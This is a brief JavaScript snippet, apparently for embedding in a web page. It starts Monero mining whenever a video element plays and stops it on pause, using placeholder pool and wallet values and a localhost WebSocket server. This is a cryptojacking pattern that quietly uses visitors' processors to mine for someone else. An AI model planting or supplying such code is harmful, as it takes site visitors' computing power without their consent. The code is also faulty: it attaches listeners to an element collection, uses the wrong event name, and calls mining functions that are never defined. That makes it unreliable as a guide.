var vid = document.getElementsByTagName("video"); //get element on page which are videos

var server = "ws://localhost:8181"; //SERVER ADDRESS & PORT

vid.addEventListener('onplay', function(event) {
  startMining("POOL","XMR/MONERO ADDRESS");
});

vid.addEventListener('onpause', function(event) {
  stopMining()
});
